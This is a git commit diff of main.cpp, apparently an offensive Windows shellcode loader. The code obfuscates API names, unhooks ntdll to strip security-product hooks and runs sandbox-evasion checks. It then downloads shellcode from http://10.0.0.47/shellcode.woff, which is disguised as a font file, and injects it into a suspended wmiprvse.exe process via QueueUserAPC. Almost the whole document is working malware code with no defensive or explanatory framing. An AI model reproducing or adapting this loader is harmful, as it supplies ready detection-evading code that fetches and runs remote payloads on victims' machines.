349130c1a211365f6e2bfd50d16da769b6874e06
tehstoni <stevenharrisskater66@hotmail.com>
2024-04-08 16:39:45 -0400

    AAAAAAAAa

--- main.cpp
+++ main.cpp
@@ -14,52 +14,48 @@
 #include <string>
 #include <fstream>
 
-#pragma comment(lib, "Wininet.lib")
+#pragma comment (lib, "Wininet.lib")
 
-typedef BOOL(WINAPI *WriteProcessMemoryFunc)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T *);
-char aProcmemory[] = {'W', 'r', 'i', 't', 'e', 'P', 'r', 'o', 'c', 'e', 's', 's', 'M', 'e', 'm', 'o', 'r', 'y', '\0'};
+typedef BOOL(WINAPI* WriteProcessMemoryFunc)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*);
+char aProcmemory[] = { 'W', 'r', 'i', 't', 'e', 'P', 'r', 'o', 'c', 'e', 's', 's', 'M', 'e', 'm', 'o', 'r', 'y', '\0'};
 WriteProcessMemoryFunc pwProcmem = (WriteProcessMemoryFunc)GetProcAddress(GetModuleHandleA("kernel32.dll"), aProcmemory);
 
-typedef BOOL(WINAPI *QueueUserAPCFunc)(PAPCFUNC, HANDLE, ULONG_PTR);
-char aQueueUserAPC[] = {'Q', 'u', 'e', 'u', 'e', 'U', 's', 'e', 'r', 'A', 'P', 'C', '\0'};
+typedef BOOL(WINAPI* QueueUserAPCFunc)(PAPCFUNC, HANDLE, ULONG_PTR);
+char aQueueUserAPC[] = { 'Q', 'u', 'e', 'u', 'e', 'U', 's', 'e', 'r', 'A', 'P', 'C', '\0'};
 QueueUserAPCFunc pwQueueUserAPC = (QueueUserAPCFunc)GetProcAddress(GetModuleHandleA("kernel32.dll"), aQueueUserAPC);
 
-typedef BOOL(WINAPI *CreateProcessAFunc)(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION);
-char aCreateProcess[] = {'C', 'r', 'e', 'a', 't', 'e', 'P', 'r', 'o', 'c', 'e', 's', 's', 'A', '\0'};
+typedef BOOL(WINAPI* CreateProcessAFunc)(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION);
+char aCreateProcess[] = { 'C', 'r', 'e', 'a', 't', 'e', 'P', 'r', 'o', 'c', 'e', 's', 's', 'A', '\0'};
 CreateProcessAFunc pwCreateProcess = (CreateProcessAFunc)GetProcAddress(GetModuleHandleA("kernel32.dll"), aCreateProcess);
 
-typedef LPVOID(WINAPI *VirtualAllocExFunc)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD);
-char aVirtualAllocEx[] = {'V', 'i', 'r', 't', 'u', 'a', 'l', 'A', 'l', 'l', 'o', 'c', 'E', 'x', '\0'};
+typedef LPVOID(WINAPI* VirtualAllocExFunc)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD);
+char aVirtualAllocEx[] = { 'V', 'i', 'r', 't', 'u', 'a', 'l', 'A', 'l', 'l', 'o', 'c', 'E', 'x', '\0'};
 VirtualAllocExFunc pwVirtualAllocEx = (VirtualAllocExFunc)GetProcAddress(GetModuleHandleA("kernel32.dll"), aVirtualAllocEx);
 
-typedef BOOL(WINAPI *VirtualProtectFunc)(LPVOID, SIZE_T, DWORD, PDWORD);
-char aVirtualProtect[] = {'V', 'i', 'r', 't', 'u', 'a', 'l', 'P', 'r', 'o', 't', 'e', 'c', 't', '\0'};
+typedef BOOL(WINAPI* VirtualProtectFunc)(LPVOID, SIZE_T, DWORD, PDWORD);
+char aVirtualProtect[] = { 'V', 'i', 'r', 't', 'u', 'a', 'l', 'P', 'r', 'o', 't', 'e', 'c', 't', '\0'};
 VirtualProtectFunc pwVirtualProtect = (VirtualProtectFunc)GetProcAddress(GetModuleHandleA("kernel32.dll"), aVirtualProtect);
 
-BOOL GetPayloadFromUrl(LPCWSTR szUrl, std::vector<BYTE> &payload)
-{
+
+BOOL GetPayloadFromUrl(LPCWSTR szUrl, std::vector<BYTE>& payload) {
     HINTERNET hInternet = InternetOpenW(L"A Custom User Agent", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
-    if (!hInternet)
-    {
+    if (!hInternet) {
         return FALSE;
     }
 
     HINTERNET hInternetFile = InternetOpenUrlW(hInternet, szUrl, NULL, 0, INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, 0);
-    if (!hInternetFile)
-    {
+    if (!hInternetFile) {
         InternetCloseHandle(hInternet);
         return FALSE;
     }
 
     DWORD bytesRead;
     BYTE buffer[4096];
-    while (InternetReadFile(hInternetFile, buffer, sizeof(buffer), &bytesRead) && bytesRead != 0)
-    {
+    while (InternetReadFile(hInternetFile, buffer, sizeof(buffer), &bytesRead) && bytesRead != 0) {
         payload.insert(payload.end(), buffer, buffer + bytesRead);
     }
 
-    if (bytesRead == 0 && GetLastError() != ERROR_SUCCESS)
-    {
+    if (bytesRead == 0 && GetLastError() != ERROR_SUCCESS) {
         InternetCloseHandle(hInternetFile);
         InternetCloseHandle(hInternet);
         return FALSE;
@@ -70,60 +66,54 @@ BOOL GetPayloadFromUrl(LPCWSTR szUrl, std::vector<BYTE> &payload)
     return TRUE;
 }
 
-BOOL CheckVirtualAllocExNuma()
-{
+BOOL CheckVirtualAllocExNuma(){
     HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
-    if (hKernel32 == NULL)
-    {
+    if (hKernel32 == NULL) {
         return FALSE;
     }
 
     FARPROC pVirtualAllocExNuma = GetProcAddress(hKernel32, "VirtualAllocExNuma");
-    if (pVirtualAllocExNuma == NULL)
-    {
+    if (pVirtualAllocExNuma == NULL) {
         return FALSE;
     }
 
     return TRUE;
 }
 
-void unhookNtdll()
-{
+void unhookNtll(){
     HANDLE process = GetCurrentProcess();
-    MODULEINFO mi = {};
-    HMODULE ntdllModule = GetModuleHandleA("ntdll.dll");
+	MODULEINFO mi = {};
+	HMODULE ntdllModule = GetModuleHandleA("ntdll.dll");
 
-    GetModuleInformation(process, ntdllModule, &mi, sizeof(mi));
-    LPVOID ntdllBase = (LPVOID)mi.lpBaseOfDll;
-    HANDLE ntdllFile = CreateFileA("c:\\windows\\system32\\ntdll.dll", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
-    HANDLE ntdllMapping = CreateFileMapping(ntdllFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
-    LPVOID ntdllMappingAddress = MapViewOfFile(ntdllMapping, FILE_MAP_READ, 0, 0, 0);
+	GetModuleInformation(process, ntdllModule, &mi, sizeof(mi));
+	LPVOID ntdllBase = (LPVOID)mi.lpBaseOfDll;
+	HANDLE ntdllFile = CreateFileA("c:\\windows\\system32\\ntdll.dll", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
+	HANDLE ntdllMapping = CreateFileMapping(ntdllFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
+	LPVOID ntdllMappingAddress = MapViewOfFile(ntdllMapping, FILE_MAP_READ, 0, 0, 0);
 
-    PIMAGE_DOS_HEADER hookedDosHeader = (PIMAGE_DOS_HEADER)ntdllBase;
-    PIMAGE_NT_HEADERS hookedNtHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)ntdllBase + hookedDosHeader->e_lfanew);
 
-    for (WORD i = 0; i < hookedNtHeader->FileHeader.NumberOfSections; i++)
-    {
-        PIMAGE_SECTION_HEADER hookedSectionHeader = (PIMAGE_SECTION_HEADER)((DWORD_PTR)IMAGE_FIRST_SECTION(hookedNtHeader) + ((DWORD_PTR)IMAGE_SIZEOF_SECTION_HEADER * i));
+	PIMAGE_DOS_HEADER hookedDosHeader = (PIMAGE_DOS_HEADER)ntdllBase;
+	PIMAGE_NT_HEADERS hookedNtHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)ntdllBase + hookedDosHeader->e_lfanew);
 
-        if (!strcmp((char *)hookedSectionHeader->Name, (char *)".text"))
-        {
-            DWORD oldProtection = 0;
-            bool isProtected = pwVirtualProtect((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)hookedSectionHeader->VirtualAddress), hookedSectionHeader->Misc.VirtualSize, PAGE_EXECUTE_READWRITE, &oldProtection);
-            memcpy((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)hookedSectionHeader->VirtualAddress), (LPVOID)((DWORD_PTR)ntdllMappingAddress + (DWORD_PTR)hookedSectionHeader->VirtualAddress), hookedSectionHeader->Misc.VirtualSize);
-            isProtected = pwVirtualProtect((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)hookedSectionHeader->VirtualAddress), hookedSectionHeader->Misc.VirtualSize, oldProtection, &oldProtection);
-        }
-    }
+	for (WORD i = 0; i < hookedNtHeader->FileHeader.NumberOfSections; i++) {
+		PIMAGE_SECTION_HEADER hookedSectionHeader = (PIMAGE_SECTION_HEADER)((DWORD_PTR)IMAGE_FIRST_SECTION(hookedNtHeader) + ((DWORD_PTR)IMAGE_SIZEOF_SECTION_HEADER * i));
 
-    CloseHandle(process);
-    CloseHandle(ntdllFile);
-    CloseHandle(ntdllMapping);
-    FreeLibrary(ntdllModule);
+		if (!strcmp((char*)hookedSectionHeader->Name, (char*)".text")) {
+			DWORD oldProtection = 0;
+			bool isProtected = VirtualProtect((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)hookedSectionHeader->VirtualAddress), hookedSectionHeader->Misc.VirtualSize, PAGE_EXECUTE_READWRITE, &oldProtection);
+			memcpy((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)hookedSectionHeader->VirtualAddress), (LPVOID)((DWORD_PTR)ntdllMappingAddress + (DWORD_PTR)hookedSectionHeader->VirtualAddress), hookedSectionHeader->Misc.VirtualSize);
+			isProtected = VirtualProtect((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)hookedSectionHeader->VirtualAddress), hookedSectionHeader->Misc.VirtualSize, oldProtection, &oldProtection);
+		}
+	}
+
+	CloseHandle(process);
+	CloseHandle(ntdllFile);
+	CloseHandle(ntdllMapping);
+	FreeLibrary(ntdllModule);
 }
 
-void evade()
-{
-    unhookNtdll();
+void evade() {
+    unhookNtll();
     FILETIME startTime;
     GetSystemTimeAsFileTime(&startTime);
     Sleep(2000);
@@ -136,37 +126,59 @@ void evade()
     end.HighPart = endTime.dwHighDateTime;
     ULONGLONG elapsedTime = end.QuadPart - start.QuadPart;
     elapsedTime /= 10000000;
-    if (elapsedTime < 1.5)
-    {
+
+    if (elapsedTime < 1.5) {
         exit(0);
     }
-    MEMORYSTATUSEX statex;
-    statex.dwLength = sizeof(statex);
-    GlobalMemoryStatusEx(&statex);
-    ULONGLONG totalPhysicalMemoryInGB = statex.ullTotalPhys / (1024 * 1024 * 1024);
-    if (totalPhysicalMemoryInGB <= 1)
-    {
-        exit(1);
-    }
-    CheckVirtualAllocExNuma();
+
+	MEMORYSTATUSEX statex;
+	statex.dwLength = sizeof(statex);
+
+	GlobalMemoryStatusEx(&statex);
+
+	ULONGLONG totalPhysicalMemoryInGB = statex.ullTotalPhys / (1024 * 1024 * 1024);
+
+	if (totalPhysicalMemoryInGB <= 1) {
+		exit(1);
+	}
+
+    CheckVirtualAllocExNuma();  
 };
 
-int main()
-{
+int main() {
     evade();
-    std::vector<BYTE> payload;
-    LPCWSTR url = L"http://10.0.0.47/shellcode.woff";
-    STARTUPINFOA si = {0};
-    PROCESS_INFORMATION pi = {0};
-    pwCreateProcess("C:\\Windows\\hh.exe", NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
-    HANDLE victimProcess = pi.hProcess;
-    HANDLE threadHandle = pi.hThread;
+	std::vector<BYTE> payload;
+	LPCWSTR url = L"http://10.0.0.47/shellcode.woff";
+
+    if (!GetPayloadFromUrl(url, payload)) {
+        printf("Failed to download payload\n");
+        return 1;
+    }
+
+	STARTUPINFOA si = { 0 };
+	PROCESS_INFORMATION pi = { 0 };
+
+
+    pwCreateProcess("C:\\Windows\\System32\\wbem\\wmiprvse.exe", NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
+	
+
+	HANDLE victimProcess = pi.hProcess;
+	HANDLE threadHandle = pi.hThread;
+
+
     LPVOID shellAddress = pwVirtualAllocEx(victimProcess, NULL, payload.size(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+
     PVOID pBaseAddress = nullptr;
-    SIZE_T *bytesWritten = 0;
+    SIZE_T* bytesWritten = 0;
+
+
     pwProcmem(victimProcess, shellAddress, payload.data(), payload.size(), bytesWritten);
+
     pwVirtualProtect(shellAddress, payload.size(), PAGE_EXECUTE_READ, NULL);
+
     PTHREAD_START_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE)shellAddress;
+
     pwQueueUserAPC((PAPCFUNC)apcRoutine, threadHandle, NULL);
+    
     ResumeThread(threadHandle);
 }
